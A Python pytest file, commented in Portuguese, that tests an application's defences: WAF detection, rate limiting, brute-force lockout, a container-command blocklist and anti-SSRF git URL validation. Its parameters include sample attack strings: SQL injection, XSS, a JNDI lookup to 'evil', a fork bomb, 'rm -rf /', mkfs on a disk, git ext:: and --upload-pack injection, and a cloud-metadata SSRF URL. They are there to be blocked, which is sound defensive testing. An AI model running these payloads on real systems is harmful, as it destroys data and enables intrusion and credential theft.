"""RF de segurança ativa: WAF, rate limiting, anti-brute-force e política de exec."""

import pytest
from fastapi import HTTPException

from app.core.waf import validate_safe_container_command, validate_safe_git_url


@pytest.mark.parametrize(
    "path,query,expected",
    [
        ("/api/v1/projects", "name=../../etc/passwd", "Path Traversal"),
        ("/api/v1/projects", "id=1%20UNION%20SELECT%20password%20FROM%20users", "SQL Injection"),
        ("/api/v1/projects", "q=<script>alert(1)</script>", "Cross-Site Scripting"),
        ("/api/v1/projects", "x=${jndi:ldap://evil/a}", "Remote Code Execution"),
    ],
)
def test_waf_detects_attack_signatures(fresh_security_manager, path, query, expected):
    result = fresh_security_manager.inspect_request("1.2.3.4", path, query)
    assert result is not None and expected in result


@pytest.mark.parametrize("query", ["", "page=2&sort=name", "q=hello+world", "name=meu-projeto"])
def test_waf_allows_legitimate_traffic(fresh_security_manager, query):
    assert fresh_security_manager.inspect_request("1.2.3.4", "/api/v1/projects", query) is None


def test_waf_can_be_disabled(fresh_security_manager):
    fresh_security_manager.config["waf_enabled"] = False
    assert fresh_security_manager.inspect_request("1.1.1.1", "/x", "q=<script>") is None


def test_waf_updates_statistics(fresh_security_manager):
    fresh_security_manager.inspect_request("1.1.1.1", "/x", "q=<script>alert(1)</script>")
    assert fresh_security_manager.stats["waf_attacks_blocked"] == 1


def test_rate_limit_triggers_after_threshold(fresh_security_manager):
    fresh_security_manager.config["rate_limit_per_minute"] = 5
    results = [fresh_security_manager.check_rate_limit("9.9.9.9", "/x") for _ in range(8)]
    assert results[:5] == [False] * 5
    assert all(results[5:])
    assert fresh_security_manager.stats["rate_limits_triggered"] == 3


def test_rate_limit_is_per_ip(fresh_security_manager):
    fresh_security_manager.config["rate_limit_per_minute"] = 2
    for _ in range(5):
        fresh_security_manager.check_rate_limit("1.1.1.1", "/x")
    assert fresh_security_manager.check_rate_limit("2.2.2.2", "/x") is False


def test_bruteforce_blocks_ip_after_max_attempts(fresh_security_manager):
    sm = fresh_security_manager
    max_attempts = sm.config["login_max_attempts"]
    outcomes = [sm.record_login_failure("6.6.6.6", "admin") for _ in range(max_attempts)]
    assert outcomes[:-1] == [False] * (max_attempts - 1)
    assert outcomes[-1] is True
    assert sm.is_ip_blocked("6.6.6.6") is not None
    assert sm.stats["brute_force_blocks"] == 1


def test_successful_login_resets_failure_counter(fresh_security_manager):
    sm = fresh_security_manager
    for _ in range(sm.config["login_max_attempts"] - 1):
        sm.record_login_failure("7.7.7.7", "admin")
    sm.record_login_success("7.7.7.7", "admin")
    assert sm.record_login_failure("7.7.7.7", "admin") is False


def test_manual_block_unblock_and_expiry(fresh_security_manager, monkeypatch):
    sm = fresh_security_manager
    sm.block_ip("5.5.5.5", "teste", duration_seconds=60)
    assert sm.is_ip_blocked("5.5.5.5")
    assert sm.unblock_ip("5.5.5.5") is True
    assert sm.is_ip_blocked("5.5.5.5") is None
    assert sm.unblock_ip("5.5.5.5") is False

    import app.core.waf as waf_module

    sm.block_ip("4.4.4.4", "expira", duration_seconds=1)
    real_time = waf_module.time.time()
    monkeypatch.setattr(waf_module.time, "time", lambda: real_time + 120)
    assert sm.is_ip_blocked("4.4.4.4") is None, "bloqueio temporário deveria ter expirado"


@pytest.mark.parametrize(
    "cmd",
    [
        ":(){ :|:& };:",
        "cat /var/run/docker.sock",
        "rm -rf /",
        "mkfs.ext4 /dev/sda1",
    ],
)
def test_dangerous_container_commands_are_blocked(cmd):
    with pytest.raises(HTTPException) as exc:
        validate_safe_container_command(cmd)
    assert exc.value.status_code == 403


def test_safe_container_command_is_allowed():
    assert validate_safe_container_command("  ls -la /app ") == "ls -la /app"



# ── Anti-SSRF na clonagem de repositórios ────────────────────────────────

@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",
        "ext::sh -c 'curl evil'",
        "--upload-pack=touch /tmp/x",
        "ssh://git@github.com/u/r.git",
        "http://localhost/repo.git",
        "http://127.0.0.1:8080/repo.git",
        "http://169.254.169.254/latest/meta-data",
        "http://10.0.0.5/repo.git",
        "http://192.168.1.10/repo.git",
        "",
    ],
)
def test_git_url_ssrf_is_blocked(url):
    with pytest.raises(HTTPException) as exc:
        validate_safe_git_url(url)
    assert exc.value.status_code == 400


@pytest.mark.parametrize(
    "url",
    ["https://github.com/user/repo.git", "https://gitlab.com/group/project", "http://git.example.org/x.git"],
)
def test_git_url_public_hosts_allowed(url):
    assert validate_safe_git_url(url) == url
